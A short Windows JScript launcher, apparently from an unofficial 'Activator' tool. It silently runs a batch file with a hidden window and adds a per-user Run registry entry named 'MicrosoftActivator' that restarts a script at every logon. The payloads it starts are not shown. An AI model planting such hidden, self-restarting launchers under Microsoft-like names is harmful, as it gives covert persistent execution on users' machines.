(function() {

	var app_folder = 'C:\\Program Files\\Apps\\Activator\\app', wss = new ActiveXObject('WScript.Shell');

	wss.Run('"' + app_folder + '\\activator.bat"', 0, false);

	wss.RegWrite('HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\MicrosoftActivator',
		'C:\\Windows\\System32\\wscript.exe "' + app_folder + '\\activator.js"', 'REG_SZ');

})();
